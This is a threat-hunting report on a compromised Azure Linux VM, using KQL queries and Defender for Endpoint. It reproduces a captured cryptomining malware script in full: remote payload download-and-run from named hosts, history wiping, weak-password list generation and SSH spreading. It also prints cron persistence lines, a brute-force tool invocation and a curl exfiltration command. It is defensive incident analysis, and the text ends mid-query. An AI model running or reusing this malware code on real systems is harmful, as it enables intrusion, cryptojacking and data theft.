# Threat Hunt Challenge: Azure Abuse Notice

## Platforms and Languages Leveraged
- **Windows 10 Virtual Machines** (Microsoft Azure)
- **EDR Platform**: Microsoft Defender for Endpoint
- **Kusto Query Language (KQL)**

## Scenario
Your SOC team received an urgent email from Microsoft Azure Safeguards Team
regarding potential misuse of Azure resources. Microsoft flagged your subscription for
external reports of brute-force attacks originating from one of your IP addresses. Your
organization's reputation—and your Azure subscription—is at stake.
Your SOC Manager urgently tasks you with investigating this alert. You must determine if
there's truth to these allegations and, if so, uncover how deep the compromise goes. 

---

## Steps Taken

## 1. . Validate the Allegation:

To start the investigation, I searched the **AzureNetworkAnalytics_CL** and **`DeviceLogonEvents`** table to verify ownership of the reported IP and confirm the brute force attack pattern from our environment. Our first query shows the name, MAC, Private and Public IP, aswell as the subnetwork which displays the cyber-range, our organization, confirming that the IP does infact belong to us.

**Query Used**:
```kql
AzureNetworkAnalytics_CL
| where PublicIPAddresses_s == "20.81.228.191"
| project TimeGenerated, Name_s,MACAddress_s, PrivateIPAddresses_s, PublicIPAddresses_s, Subnetwork_s
```
![image](https://github.com/user-attachments/assets/9564a07f-8f8b-4eee-97da-339979188f94)


The second query shows that the Public IP address reported, has indeed shown patterns of brute-force attacks on the device "xxlinuxprofixxx" with 100 failed login attempts over 2 minutes using the root account. With this, we can validate the allegation.

**Query Used**:
```kql
let failure_threshold = 10;
let time_window = 720h;
let trigger_window = 60s;
DeviceLogonEvents
| where (RemoteIP contains "20.81.228.191" or RemoteIP contains "10.0.0.217")  // Filter for your compromised device IPs
| where ActionType == "LogonFailed"
| where Timestamp > ago(time_window)
| summarize FailedLogonCount = count()by bin(Timestamp, trigger_window), DeviceName,DeviceId, RemoteIP, AccountName
| where FailedLogonCount >= failure_threshold
| extend ReportId = strcat("LogonFailureAlert_", DeviceName, "_", format_datetime(Timestamp, 'yyyyMMdd_HHmmss')) // Dynamic ReportId
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/8e4478ec-f656-410e-ae6a-2dfcebb9be7a)


## 2. Trace the Origin of Malicious Activity: 


### Device Info

Next, I examined the DeviceInfo table to identify the compromised host, "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net", which is a linux platform. 

**Query Used**:
```kql
DeviceInfo
| where PublicIP == "20.81.228.191"
| project Timestamp,DeviceName, PublicIP, OSPlatform
```
![image](https://github.com/user-attachments/assets/9c3f2854-d717-47ca-a492-cce775273da1)

Now that we have the host, we will comb through Logon Events, File Events, Process Events, and Network Events to determine malicious activity began and how the system was compromised. 

### Device Logon Events

Our first look at the logon events shows that the device has several IPs that stand out: 
**Query Used**:
```kql
let failure_threshold = 10;
let time_window = 90d;
let trigger_window = 60s;
DeviceLogonEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where ActionType == "LogonFailed"
| where Timestamp > ago(time_window)
| summarize FailedLogonCount = count()by bin(Timestamp, trigger_window), DeviceName,DeviceId, RemoteIP, AccountName
| where FailedLogonCount >= failure_threshold
| extend ReportId = strcat("LogonFailureAlert_", DeviceName, "_", format_datetime(Timestamp, 'yyyyMMdd_HHmmss')) // Dynamic ReportId
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/bb99b14d-0e93-4c2c-aec5-ab7c9add181b)

During the time of 0441 to 0445 on March 14th 2025, we see that the IP 8.219.145.111 has 92 failed attempts over SSHD as root, cursory reserach into the IP revelaed that it is a malicious IP via MalwareURL database. No sucessful logins were made by this IP. Next is the IP 10.0.0.217, this private IP belongs to the host and is suspsected to be a brute force test by the authorized user as seen by the account names under the attempts. The last IP 10.0.0.8 is the local scan engine in the range, although 91 attempts over 2 minutes is suspicious at a glance, this appears to be normal behavior for the local scan engine when investigating its acivity. This IP is the only one of the failed attempts to have successful logons, this is believed to be credentialed internal scanning through tenable.

### Device Process Events

**Query Used**:
```kql
DeviceProcessEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| project Timestamp, DeviceName, InitiatingProcessAccountName,AccountName, ProcessId,InitiatingProcessId, InitiatingProcessCommandLine, ProcessCommandLine, InitiatingProcessParentFileName,FileSize, FileName, InitiatingProcessFolderPath, FolderPath, SHA256, InitiatingProcessSHA256
| order by Timestamp asc
```


Our second look will be through daily Process Events in which we see unusual activity, the first of which is the command line for - bash useradd -m testuser followed by passwd -d testuser, this means that there is a account on the device that does not need credentials to access the device, it is believed that the authorized user had created this to trigger a flag in the tenable scanning.

![image](https://github.com/user-attachments/assets/1ec489bf-5cc4-4625-82be-411b8faab76e)

Further investigation sees a sucessful SSHD logon at 0546 AM March 14th, this is validated against the device logon activity from 20.169.181.216., a data center in VA. The details of the process is sshd: [accepted], followed by sh -c "/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new". What this means is that the message of the day is running which seems nornmal enough, however In the context of potential exploits, the /etc/update-motd.d/ directory can be used to run scripts as root, which can be a target for persistence mechanisms in attacks. A malicious script in this directory would be executed each time a user logs in, potentially running unauthorized commands or reconnaissance as seen with the motd.d/50-landscape-sysinfo, update-motd.d/91-release-upgrade,update-motd.d/90-updates-available  and who-q leading to a commmand to update motd fsack at reboot to determine the system's resilence. The recon chain continues with grep commands such as -q -m 1, and bash -c 'nvidia-smi -q | grep "Product Name"' to ascertain the GPU of the device leading to another logon from the same IP with the same process of MOTD following.

![image](https://github.com/user-attachments/assets/a69feeb5-8364-4db0-99cd-7cb9b89d2381)
![image](https://github.com/user-attachments/assets/b12c7771-29ad-406c-aa93-d3846867eb38)
![image](https://github.com/user-attachments/assets/fc8419db-ef24-4e7f-ac8b-aa4fe356f04e)
![image](https://github.com/user-attachments/assets/7e425515-c9d9-4f9f-94e0-f95cde577ef6)
![image](https://github.com/user-attachments/assets/ecf7de80-6d79-45c0-9f1a-a173413a26fe)
![image](https://github.com/user-attachments/assets/6ccbec14-7e37-44b7-b164-55f660110b82)
![image](https://github.com/user-attachments/assets/20cf6b24-c562-42eb-9d99-9e80b4e1a31c)


At 0546 AMWe would then observe that a suspect executable from the systemd that seems to be titled with obsfucation, "./UpzBUBnv" SHA256 "81d9ef2342cb1d7329a6b53297678c925b0b5380b2add63a140db83fa046a83d" with a connection request to 196.251.73.38 also known as ns1432.ztomy.com that a few security vendors has flagged as malicious and miner, to avoid detection at nearly the same time as the Message of the day update header.

![image](https://github.com/user-attachments/assets/f071afdf-af03-4c89-8a3c-4650f7741578)
![image](https://github.com/user-attachments/assets/6e8768bb-b07c-4ddf-82af-8ca182a4de47)
![image](https://github.com/user-attachments/assets/9d3d6374-1a4f-4e6b-9d8e-fd83598ee2e4)
![image](https://github.com/user-attachments/assets/285f3d22-997f-45ec-a462-e522395df270)
![image](https://github.com/user-attachments/assets/a356001c-b744-46dc-a1b4-3d97226a81b3)
![image](https://github.com/user-attachments/assets/bf1b052f-a5c5-44b8-9e0f-7a460e249774)
![image](https://github.com/user-attachments/assets/0c5fb201-b2d9-4506-9c1d-b0d42d8fd8da)



Based on this initial process, it seems to be killing certain services and processes such as chrome and cnrig, this seems to be indicative of exploiting the device to cryptomining and stopping competitive mining if present. The exploit would then deploy a malicious script for cryptomining with persistence mechanisms, system compromise techniques, and a focus on data exfiltration:

```
#!/bin/bash
key=$1
user=$2
if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
    echo -e ""
else
    echo "Logged with successfully."
    rm -rf .retea
    crontab -r
    pkill xrx
    pkill haiduc
    pkill blacku
    pkill xMEu
    cd /var/tmp
    rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
    mkdir /tmp/.tmp
    pkill Opera
    rm -rf xmrig .diicot .black Opera
    rm -rf .black xmrig.1
    pkill cnrig
    pkill java
    killall java
    pkill xmrig
    killall cnrig
    killall xmrig
    wget -q dinpasiune.com/payload || curl -O -s -L dinpasiune.com/payload || wget 85.31.47.99/payload || curl -O -s -L 85.31.47.99/payload
    chmod +x *
    ./payload >/dev/null 2>&1 & disown
    history -c
    rm -rf .bash_history ~/.bash_history
    chmod +x .teaca
    ./.teaca > /dev/null 2>&1
    history -c
    rm -rf .bash_history ~/.bash_history
fi

rm -rf /etc/sysctl.conf
echo "fs.file-max = 2097152" > /etc/sysctl.conf
sysctl -p
ulimit -Hn
ulimit -n 99999 -u 999999

cd /dev/shm
mkdir /dev/shm/.x > /dev/null 2>&1
mv network .x/
cd .x
rm -rf retea ips iptemp ips iplist
sleep 1
rm -rf pass

useri=`cat /etc/passwd |grep -v nologin |grep -v false |grep -v sync |grep -v halt |grep -v shutdown |cut -d: -f1`
echo $useri > .usrs
pasus=.usrs
check=`grep -c . .usrs`

for us in $(cat $pasus) ; do
    printf "$us $us\n" >> pass
    printf "$us "$us"\n" >> pass
    printf "$us "$us"123\n" >> pass
    printf "$us "$us"123456\n" >> pass
    printf "$us 123456\n" >> pass
    printf "$us 1\n" >> pass
    printf "$us 12\n" >> pass
    printf "$us 123\n" >> pass
    printf "$us 1234\n" >> pass
    printf "$us 12345\n" >> pass
    printf "$us 12345678\n" >> pass
    printf "$us 123456789\n" >> pass
    printf "$us 123.com\n" >> pass
    printf "$us 123456.com\n" >> pass
    printf "$us 123\n" >> pass
    printf "$us 1qaz@WSX\n" >> pass
    printf "$us "$us"@123\n" >> pass
    printf "$us "$us"@1234\n" >> pass
    printf "$us "$us"@123456\n" >> pass
    printf "$us "$us"123\n" >> pass
    printf "$us "$us"1234\n" >> pass
    printf "$us "$us"123456\n" >> pass
    printf "$us qwer1234\n" >> pass
    printf "$us 111111\n" >> pass
    printf "$us Passw0rd\n" >> pass
    printf "$us P@ssw0rd\n" >> pass
    printf "$us qaz123!@#\n" >> pass
    printf "$us !@#\n" >> pass
    printf "$us password\n" >> pass
    printf "$us Huawei@123\n" >> pass
done

wait
sleep 0.5
cat bios.txt | sort -R | uniq | uniq > i
cat i > bios.txt

./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"

sleep 25

function Miner {
    rm -rf /dev/shm/retea /dev/shm/.magic
    rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
    rm -rf ~/.bash_history
    history -c
}

Miner
```

***Malicious Elements:***

**Remote Payload Download & Execution:**
--The script uses wget and curl to download and execute payloads from suspicious domains (e.g., dinpasiune.com and 85.31.47.99), potentially delivering a cryptominer or other malware.

**System Cleanup & Concealment:**
--Clears evidence by deleting logs (.bash_history, history -c) and critical files (e.g., /var/tmp/.update-logs).
--Deletes or disables competing malware or services by killing processes (pkill xmrig, pkill java, etc.).

**Password List Generation:**
--Generates weak default passwords for users by extracting system usernames (cat /etc/passwd) and creating combinations of usernames and weak password strings like 123456, password, Passw0rd.

**Persistence Mechanisms:**
--The script recreates critical files (/etc/sysctl.conf), updates file limits, and ensures system stability for continued operation of the malware.
--It also re-establishes itself through crontab manipulation and uses /dev/shm/.x for storing malicious files, which is commonly used for persistence.

**Crontab & SSH Key Manipulation:**
--Crontab entries are removed, potentially removing legitimate or other scheduled tasks, while setting up new ones to run the miner regularly.
--SSH keys are manipulated (chattr -iae ~/.ssh/authorized_keys) to avoid detection or disable administrative access.

**Connection Attempts & Data Exfiltration:**
--The ./network component and references to .diicot indicate potential exfiltration of sensitive data or continued control through a network communication mechanism.

**Miner Function:**
--Cleans up the environment by removing evidence and attempting to continue cryptomining operations using files like /tmp/kuak or /var/tmp/Documents/.diicot.

**SHA256:**
--The SHA256 hash provided (59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4) refers to the binary or script identified in this incident, useful for file identification in threat databases.

This would be followed by a sequence of commands from the script designed to extract valid user accounts from the system and manipulate data for further use in an attack, and another script performing several actions related to system manipulation, persistence, and concealment SHA256 hash provided (cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255). 

![image](https://github.com/user-attachments/assets/486d37f4-8483-4fb1-9ef0-cd033ce2211e)
```
bash
./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1
crontab -r
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
cd /var/tmp
chattr -iae /var/tmp/Documents/.diicot
pkill Opera
pkill cnrig
pkill java
killall java
pkill xmrig
killall cnrig
killall xmrig
cd /var/tmp/
mv /var/tmp/diicot /var/tmp/Documents/.diicot
mv /var/tmp/kuak /var/tmp/Documents/kuak
cd /var/tmp/Documents
chmod +x .*
/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
history -c
rm -rf .bash_history ~/.bash_history
rm -rf /tmp/cache
cd /tmp/
wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu
mv .balu cache
chmod +x cache
./cache >/dev/null 2>&1 & disown
history -c
rm -rf .bash_history ~/.bash_history"
```
Further investigation revealed a persistent threat targeting the system, leveraging services, scripts, and cron jobs to conduct malicious activities such as SSH brute-forcing and potential data mining. The activities centered around the /var/tmp/.update-logs/ directory and specifically the use of the .bisis executable, which facilitated network exploitation and unauthorized access. 

**Systemctl Service Manipulation**

![image](https://github.com/user-attachments/assets/d0d9a2d2-2f5c-431d-9c55-8c5b89fb583a)


The malicious actor set up the persistence by enabling a custom service through systemctl. This action ensures that the service, named "myservice", starts upon system boot, providing continuous execution of the malicious processes after reboots.

Effect: This tactic guarantees that malicious activities continue running in the background, regardless of any system reboots or shutdowns. This service likely points to a malicious script that the attacker can control remotely or leverage for unauthorized access or brute-force operations.

**Creation and Execution of Cron Jobs:**

![image](https://github.com/user-attachments/assets/52f228b7-4bff-43af-b80c-f9f42ad8477f)
```
bash -c "echo '@daily
 /var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @reboot /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * *
/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @monthly /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * *
/var/tmp/.update-logs/./.b >/dev/null 2>&1 & disown'
| crontab -"
```

This command created multiple cron jobs to execute files from the /var/tmp/.update-logs/ directory on a daily, monthly, and minute-by-minute basis. These jobs are set to run in the background using the disown command to detach from the terminal and avoid monitoring.

Files scheduled by cron jobs:

Update: Appears to be a key malware component.
History: Likely logs or tracks system history.
.b: Another malicious file, potentially used for network exploitation or lateral movement.

**Suspicious Script Execution and System Modification:**

![image](https://github.com/user-attachments/assets/a34598cc-500e-4c7e-8d6e-d594226ece18)


```
bash -c "cd /var/tmp/.update-logs ;
 chmod +x /var/tmp/.update-logs/.bisis ;
ulimit -n 999999 ;
cat /var/tmp/.update-logs/iplist
| /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8 ;
 /var/tmp/.update-logs/x"
```
This command executes the .bisis file after setting permissions to allow execution (chmod +x). The ulimit -n 999999 command increases the maximum number of open file descriptors, indicating an attempt to handle a large volume of connections or network operations.

The .bisis file is used to read from an iplist file and perform SSH connections with no authentication (--userauth none) via the ssh command, targeting multiple IP addresses. The involvement of the iplist and data.json suggests a brute-force SSH attack or exploitation attempt across a list of IP addresses.

**.bisis File Execution:**

![image](https://github.com/user-attachments/assets/f404cbe9-7706-4e02-9a30-f41d6a186d24)
![image](https://github.com/user-attachments/assets/cf088d40-e533-4f2f-8c7d-68e9fce76ad8)

The .bisis executable is responsible for performing SSH connections with no user authentication, likely for brute-force attempts or network probing. The file reads IP addresses from the iplist file and attempts connections using the ssh command.


After some time there have been a continuous string of processes implemented by CRON mirroring the /var/tmp/.update-logs/Update pattern leading to /var/tmp/.update-logs/.bisis activating on the system over and over with a minute to two minute pauses in addition of pgrep -x cache commands which produced a cache file over 1MB, The cache process executed here reinforces the likelihood of a persistent, scripted attack that leverages cron jobs and temporary directories for continued malicious operations. The malware has established mechanisms to remain active and hide its processes, potentially involving data mining or other unauthorized activities.

The cache file, based on its size, frequency, and placement in /tmp, could be related to data storage, exfiltration, or other malicious caching techniques.

Now up until 0617 AM, there haven't been any deviations from this pattern until a initiating process from the systemd led to a process command line of /bin/bash /usr/bin/ssshd. This stands out from the observed behavior as this log indicates that the root user is invoking a bash process associated with /usr/bin/ssshd. The suspicious file path (/usr/bin/ssshd) is likely a masquerading file. Attackers often name malicious binaries in ways that mimic legitimate services, such as sshd (the OpenSSH daemon), adding extra characters (e.g., ssshd) to evade detection.

This is followed by the root user executing a command to use curl for connecting to an external IP address (196.251.114.67) and downloading a file from a suspicious path (/.x/black3). This behavior is typical of malware trying to download additional components or payloads from a remote server.

![image](https://github.com/user-attachments/assets/70b5ffd6-0bd5-48eb-826d-0b0cdadf5c51)

**Key Observations:**

**Suspicious File (ssshd):** The process /usr/bin/ssshd is most likely masquerading as a legitimate service to avoid detection. The addition of extra characters to resemble sshd is a common tactic used by attackers to disguise malicious files.

**External Connection (196.251.114.67):** The use of curl to contact an external server located in Amsterdam (196.251.114.67) and download a file from the .x/black3 path indicates that the system is trying to retrieve potentially malicious payloads. This IP address is most likely associated with an attacker-controlled server.

**Automated Activity:** The repeated execution of bash commands, coupled with the ssshd service, suggests this is part of an automated infection or malware behavior, possibly trying to maintain persistence or fetch additional resources for exploitation.

The malicious activity would cease until a CRON command at 0727 AM resumed the pattern for /bin/bash /var/tmp/.update-logs/./.b with various pauses of various lengths through the monring, and the observance of the /usr/sbin/sshd -D -R followed MOTD exploit was seen again at 0740 AM leading to another instance of a CRON command at 0755 AM with update-logs pattern followed by the ssshd to curl 196.251.114.67 followed by new additions to the pattern in the form of process commands such as /bin/bash /var/tmp/.update-logs/x followed by  cat data.json, grep OpenSSH, and awk -F " '/"ip":/ {ip=$4} /"userauth":/ && /password/ {print ip}' .temp. 

This indicates that the script located at /var/tmp/.update-logs/x is attempting to read and possibly process a file named data.json. The contents of this file could be related to the attacker’s data collection, such as credentials or system data.

![image](https://github.com/user-attachments/assets/baf61e77-5739-4b7b-82fd-34bea2e45d0d)

The grep command is filtering content to search for occurrences of "OpenSSH." This suggests the attacker might be looking for logs or information related to OpenSSH, which could include SSH authentication attempts, possibly indicating an interest in exploiting SSH-related vulnerabilities. 

![image](https://github.com/user-attachments/assets/7390fd32-c24c-426b-8311-18a5c6839db3)

The awk command filters through a file named .temp to extract IP addresses related to password-based user authentication attempts. The pattern being matched, "userauth" and "password", suggests that this process is attempting to harvest IP addresses associated with SSH login attempts using password-based authentication, potentially identifying weak or compromised accounts.

![image](https://github.com/user-attachments/assets/1e9df02a-93b6-4f2d-b60b-37f134e88c30)

These commands are characteristic of post-compromise activity, where the attacker is leveraging the system to extract valuable information, likely to exploit SSH vulnerabilities or credential weaknesses further. The suspicious behavior of processing data in hidden directories like /var/tmp/.update-logs/ and using tools like awk, grep, and cat to sift through data files and logs points to a malicious intent.

At 0826 AM another ssshd pattern was observed followed by another /var/tmp/.update-logs/Update pattern at 0829 AM and a CRON command for /bin/sh -c "/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown" at 0831 AM followed by another at 0833 AM ending in a ./cache command. Theses series of patterns occur once more before 0846 AM until a shutdown executed by root occured at 0904 AM March 14th 2025. The Device would be active again at March 17 2025 at 0320 AM, a CRON to update-logs, cache, and pidof update pattern was observed at 0321 AM indicating that the malware was still present during the authorized user's labs 

![image](https://github.com/user-attachments/assets/da0832d5-6da9-4a56-a967-b248a23ca3ad)

The Device carries on as usual with the malware, until a suspcious telnet login attempt was made at 0328 AM from IP 114.41.214.182 which turned out to be from taiwan, the process logs continued to show telnet processes which would be indicative of a continued presence from the previous telnet login followed by a series of what appear to be Reconnaissance Activity

![image](https://github.com/user-attachments/assets/9f3c14dd-4c35-420d-b47f-7688ac5dd5c9)
![image](https://github.com/user-attachments/assets/066b8a45-a88b-4c97-a69d-22a40081e0f6)

From that time until 0343 AM, the user applied updates to the linux machine however the malware was still present as observed at 0344 AM when a CRON to update-logs pattern occured. The device then proceeds as usual with the malware until new behavior from the malware was observed at 0448 AM, this behavior is consistent with data exfiltration when observing the code:


```bash -c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
    -H "Accept-Language: en-US,en;q=0.9" \
    -H "Cache-Control: max-age=0" \
    -H "Connection: keep-alive" \
    -H "Upgrade-Insecure-Requests: 1" \
    --insecure'
```


![image](https://github.com/user-attachments/assets/31143b39-2e80-4ca9-963c-3d242ffc0b0a)

This process is trying to exfiltrate data to an external IP 196.251.73.38 using the curl command. It is passing an IP address 200.98.137.5 as a parameter in the URL, possibly representing the internal system IP or another target in the attack chain. The command includes several headers (e.g., Accept, Accept-Language, Connection, etc.), indicating the request is trying to mimic legitimate web traffic, but using the --insecure flag to bypass SSL certificate verification, further supporting that this is malicious.

These logs show that the process repeats itself multiple times, indicating that data exfiltration is continuous. This behavior strongly points to an active and persistent compromise, where the attacker is collecting and sending sensitive information out of the system in small batches to avoid detection. There were 196 occurrences with a total file size of 162,371,104 bytes (around 162 MB).

This behavior would now be observed in addition to the usual malware behavior throughout the rest of the device's activities all the way to 0645 PM to it's last process.

### Device File Events

The creation of the UpzBUBnv file at 0546 AM shows the process command to be scp -qt /var/tmp/UpzBUBnv, The use of scp to copy a file into /var/tmp/, combined with root privileges and previous investigation, confirms a malicious operation, such as downloading a payload or malware to be executed later that we see with Retea process.

![image](https://github.com/user-attachments/assets/5f422313-0324-44a7-a400-8210d95c6838)

Here we see the x.sh file, which is part of the .x/network process and network event that made connection requests to 10.0.0.0 - 255, this is suspected to be both recon into the network, staging for lateral movement and persistence in the network.

![image](https://github.com/user-attachments/assets/9ecdb6ef-1656-46b0-a860-dfb7833f8100)

as mentioned previously, the Retea file, SHA256 94c7c6ca6042201ba200a267a5e0aa4b2d467445bda35a234c1c23dc14359eb7, was created as a result of the UpzBUBnv file. As we have seen before, the retea script is quite lenghty.

![image](https://github.com/user-attachments/assets/f9fc90d9-4290-4f2e-b79d-2a55be55c3d9)

Next we would see the file creation of kuak and diicot in the tmp directory, likely continuing to plant or download malicious files as initiated by the .x/network script.

![image](https://github.com/user-attachments/assets/781927b9-f521-4a3f-b1c8-62e91e15bb79)

Next we see a file deletion event for .send.json initiated by the ./UpzBUBnv script, the deletion of .send.json at this stage indicates that the attacker may have completed a specific task (e.g., exfiltrating data or completing a communication), and is now removing the evidence. Given the frequent use of the /tmp and /var/tmp directories, the attacker is utilizing temporary storage spaces to avoid detection.

![image](https://github.com/user-attachments/assets/f4a81a34-745b-443e-ab78-ac5d0df934c3)

The creation of ssshd in /usr/bin/ indicates that the attacker is attempting to persist on the system by mimicking legitimate system processes. This could allow them to maintain access, potentially through a malicious SSH service or another form of backdoor. The small file size suggests it's likely a script or a small utility meant to be part of a larger compromise.

![image](https://github.com/user-attachments/assets/a8f25e8a-2b9c-4a3b-9460-b4ea768359a4)


The creation of this Update file is likely part of the malicious activities associated with the UpzBUBnv process. Given its size and location, this file could be a key component of the payload, potentially containing additional malicious software, scripts, or even updates to the attacker's malware.

![image](https://github.com/user-attachments/assets/7e51ec9c-8f24-40fb-99fa-05db03fe3eee)

The file gogu appears to be either a copy or a variant of the previously seen UpzBUBnv file based on the identical hash. Since it is created in the /dev/shm/ directory, it is intended for temporary use, potentially to avoid detection by being stored in memory.

![image](https://github.com/user-attachments/assets/dfa2aa5b-4006-4118-a2d6-71897621f48e)

The next entries are as expected with the creation of certain files in the tmp directory, the only standout is the .bisis file at just over 10 MB,  suggesting it contains a more substantial payload, such as an executable, data, or script. It appears to be a core file within the attacker’s setup, possibly involved in data exfiltration or execution of commands.

![image](https://github.com/user-attachments/assets/20230642-6c1a-4d3d-af37-62700f9cc9f7)

The events indicate that a malicious process on sakel-lunix-2 is creating files and modifying a cron job under the root account. The process, located in /var/tmp/.update-logs, is frequently creating small files (like .b) and setting up or modifying scheduled tasks using cron to ensure persistence and potentially execute malicious commands at regular intervals. The cron job likely enables ongoing attacks or data exfiltration. The creation of files with obfuscated filenames that always start with "tmp." after each sequence of malicious activities, particularly in the /var/spool/cron/crontabs/ directory, suggests that the attacker is likely using these files to store or execute temporary tasks via cron. These files could be acting as placeholders or additional cron jobs to execute malicious commands, further solidifying persistence on the system. This would be the end of the file events for the 14th of March 2025.

![image](https://github.com/user-attachments/assets/babb89e7-169d-4b7e-b528-7933e4227eb8)
![image](https://github.com/user-attachments/assets/a1f50c9a-95f0-4d92-808a-34cef3aa613a)
![image](https://github.com/user-attachments/assets/378db402-d394-4d2a-8368-294d39b7c755)
![image](https://github.com/user-attachments/assets/f3c79dd0-ba7f-4306-ae62-4c561a0f2a01)

the 17th of March 2025 would not see any new behavior from the malware.

### Network Events

**Query Used**:
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| project Timestamp, DeviceName, ActionType, RemoteIP, InitiatingProcessFileSize, RemotePort,Protocol, RemoteIPType, InitiatingProcessFolderPath, InitiatingProcessParentFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp asc
```

The previous query did lead us to find an event that had /dev/shm/.x/network scan the internal private network by making a connection request to 10.0.0.0 at 0546 AM on March 14th 2025, as previously stated this could be lateral movement and we will further investigate if other devices on the network have been compromised near the end of this report. Now around 0548 AM, we notice a connection request to the public IP address 140.186.11.236 over port 22 (SSH), initiated from the process located at /var/tmp/.update-logs/.bisis, suggests that the attacker is attempting to establish an SSH connection. The use of --userauth none indicates that the connection is trying to bypass authentication, likely exploiting a weak or misconfigured SSH server at the remote IP.

![image](https://github.com/user-attachments/assets/881a6b2e-8288-4e50-88dc-0184b3da5ce7)

further investgiation found that numerous IPs were targeted: 

March 17, 2025:

4:00 AM: 47,793 times

3:00 AM: 37,360 times

March 14, 2025:

8:00 AM: 26,601 times

7:00 AM: 32,950 times

6:00 AM: 30,063 times

5:00 AM: 7,727 times

**Query Used**:
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where InitiatingProcessCommandLine contains "/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8"
| summarize IPTargetedCount = count() by bin(Timestamp, 1h)
| order by Timestamp desc
```

![image](https://github.com/user-attachments/assets/9da72e08-c76e-4269-8fb4-aa7b60bb8703)

In addition to this script, the /var/tmp/.update-logs/update path and proccess command are also making the same connection requests at lower counts than the previous script

March 17, 2025:

4:00 AM: 310 times

March 14, 2025:

8:00 AM: 868 times

6:00 AM: 754 times

**Query Used**:
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where InitiatingProcessCommandLine contains  "/var/tmp/.update-logs/update"
| summarize IPTargetedCount = count() by bin(Timestamp, 1h)
| order by Timestamp desc
```
![image](https://github.com/user-attachments/assets/6c8e6068-aebb-4845-9270-658d5df50996)

After sorting out the numerous malicious events, we're left with 100 entries out of what is over 100,000 events from the scripts alone. In this we see the ./UpzBUBnv connection requests and the curl commands from earlier, however now we can see a connection request regarding the cache file that was created and seen repeating in the process table. The request is to 87.120.114.219, a data center in Bulgaria. This connection request would repeat 4 times.

![image](https://github.com/user-attachments/assets/7604198d-138c-4b2b-ac5e-aff49b1c2773)

We have reached the end of this Device's investigation, and can surmise a pattern or behavior for the malware that infected the machine. However the point of insertion is not clear with only speculation, my working theory is that another machine on the network of similiar build was infected and had pinged this device as part of the .x/network script and network events, thus opening the device to recon from the attacker. While there are some suspect connections, my leading theory is that one sshd connection followed by a run-parts process was the start of the attack chain. 

This investigation feels halfway done if my theory of lateral movement prior to this device's compromise is true, to confirm this we will query the network for similiar events.

## Investigation of Internal Network

The first thing that I want to check is the presence of the same retea script in the network, this query initially returned 6 devices but as of March 23rd, 2025, it returns 5 devices. This is due to the 30 day data retention for advanced hunting, at a later point in this investigation we will have to utilize MDE data. about 80% of the devices share similiar process counts for the script.

**Query Used**:
```kql
DeviceProcessEvents
| where InitiatingProcessCommandLine contains "./retea -c"
| summarize ProcessCount = count() by DeviceName, AccountName, bin(Timestamp, 1h)
| project Timestamp, DeviceName, AccountName, ProcessCount
| order by Timestamp asc
```
![image](https://github.com/user-attachments/assets/6c83f87b-1fb7-4664-8154-e21cf0dc0564)

However when we run a query directly targeting the network activity for .bisis activity, we find eight devices, granted two seem to be duplicates but for now we will assume they are different devices. As we can see, the numbers are the amount of target IPs that connection attempts to were made are 661,105. 

**Query Used**:
```kql
